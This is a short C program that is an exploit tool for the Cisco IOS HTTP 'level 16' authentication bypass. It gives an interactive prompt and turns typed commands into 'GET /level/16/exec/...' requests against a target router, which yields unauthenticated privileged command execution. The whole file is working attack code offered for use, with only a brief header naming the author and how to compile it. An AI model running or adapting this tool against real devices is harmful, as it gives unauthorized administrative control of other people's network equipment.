/* Coded and backdored by Eliel C. Sardanons <eliel.sardanons@philips.edu.ar>
 * to compile:
 * bash# gcc -o cisco cisco.c 
 */

#include <stdio.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define HTTP_PORT 80
#define PROMPT "\ncisco$ "

int usage (char *progname) {
        printf ("Usage:\n\t%s server\n", progname);
        exit(-1);
}                                                               
        
int main (int argc, char *argv[]) {
        struct hostent *he;
        struct sockaddr_in sin;
        int sck, i;
        char command[256], buffer[512];
        if (argc < 2)
                usage(argv[0]);
        if ((he = gethostbyname(argv[1])) == NULL) {
                perror("host()");
                exit(-1);
        }
        sin.sin_family = AF_INET;
        sin.sin_port = htons(HTTP_PORT);
        sin.sin_addr = *((struct in_addr *)he->h_addr);
        while (1) {
                if ((sck = socket (AF_INET, SOCK_STREAM, 6)) <= 0) {
                        perror("socket()");
                        exit(-1);
                }
                if ((connect(sck, (struct sockaddr *)&sin, sizeof(sin))) < 0) {
                        perror ("connect()");
                        exit(-1);
                }
                printf (PROMPT);
                fgets (command, 256, stdin);
                if (strlen(command) == 1) 
                        break;
                for (i=0;i<strlen(command);i++) {
                        if (command[i] == ' ')
                                command[i] = '/';
                }
                snprintf (buffer, sizeof(buffer), 
                                                        "GET /level/16/exec/%s HTTP/1.0\r\n\r\n", command); 
                write (sck, buffer, strlen(buffer));
                memset (buffer, 0, sizeof(buffer));
                while ((read (sck, buffer, sizeof(buffer))) != 0) {
                        if ((strstr(buffer, "CR</A>")) != 0) {
                                printf ("You need to complete the command with more parameters or finish the command with 'CR'\n");
                                memset (buffer, 0, sizeof(buffer));
                                break;
                        } else if ((strstr(buffer, "Unauthorized")) != 0) {
                                printf ("Server not vulnerable\n");
                                exit(-1);
                        } else {
                                printf ("%s", buffer);
                                memset (buffer, 0, sizeof(buffer));
                        }
                 }
        }
        printf ("Thanks...\n");
        exit(0);
}
